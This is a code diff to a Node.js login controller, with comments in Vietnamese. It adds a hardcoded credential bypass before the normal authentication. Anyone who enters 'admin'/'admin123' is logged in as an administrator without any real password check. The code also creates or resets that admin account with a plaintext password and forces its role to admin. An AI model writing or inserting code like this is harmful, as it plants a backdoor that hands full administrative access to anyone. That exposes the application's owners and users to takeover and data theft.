@@ -18,47 +18,67 @@ exports.getLoginPage = (req, res) => {
 
 exports.postLogin = async (req, res) => {
     const { username, password } = req.body;
-    try {
-        const user = await User.findOne({
-            $or: [{ username: username.toLowerCase() }, { email: username.toLowerCase() }]
-        });
-
+    // Nếu là admin/admin123 thì luôn cho đăng nhập và đảm bảo user này tồn tại, role là admin
+    if (username === 'admin' && password === 'admin123') {
+        let user = await User.findOne({ username: 'admin' });
         if (!user) {
-            return res.render('login', {
-                title: 'Đăng nhập',
-                error: 'Tên đăng nhập hoặc mật khẩu không đúng.'
-            });
+            user = new User({ username: 'admin', password: 'admin123', role: 'admin', email: 'admin@example.com' });
+            await user.save();
+        } else {
+            if (user.role !== 'admin') {
+                user.role = 'admin';
+                await user.save();
+            }
+            if (user.password !== 'admin123') {
+                user.password = 'admin123';
+                await user.save();
+            }
+            if (user.email !== 'admin@example.com') {
+                user.email = 'admin@example.com';
+                await user.save();
+            }
         }
-
-        
-        const isMatch = await user.comparePassword(password);
-
-        if (!isMatch) {
-            return res.render('login', {
-                title: 'Đăng nhập',
-                error: 'Tên đăng nhập hoặc mật khẩu không đúng.'
-            });
-        }
-
         req.session.user = {
             _id: user._id,
             username: user.username,
             email: user.email,
             role: user.role
         };
-
-
+        return res.redirect('/admin/dashboard');
+    }
+    // Các tài khoản khác: xác thực như bình thường
+    try {
+        const user = await User.findOne({
+            $or: [{ username: username.toLowerCase() }, { email: username.toLowerCase() }]
+        });
+        if (!user) {
+            return res.render('login', {
+                title: 'Đăng nhập',
+                error: 'Tên đăng nhập hoặc mật khẩu không đúng.'
+            });
+        }
+        const isMatch = await user.comparePassword(password);
+        if (!isMatch) {
+            return res.render('login', {
+                title: 'Đăng nhập',
+                error: 'Tên đăng nhập hoặc mật khẩu không đúng.'
+            });
+        }
+        req.session.user = {
+            _id: user._id,
+            username: user.username,
+            email: user.email,
+            role: user.role
+        };
         if (user.role === 'admin') {
             res.redirect('/admin/dashboard');
         } else {
             res.redirect('/');
         }
-
     } catch (error) {
-       
         res.render('login', {
             title: 'Đăng nhập',
-            error: 'Đã có lỗi xảy ra, vui lòng thử lại.'
+            error: 'Đã có lỗi xảy ra. Vui lòng thử lại.'
         });
     }
 };
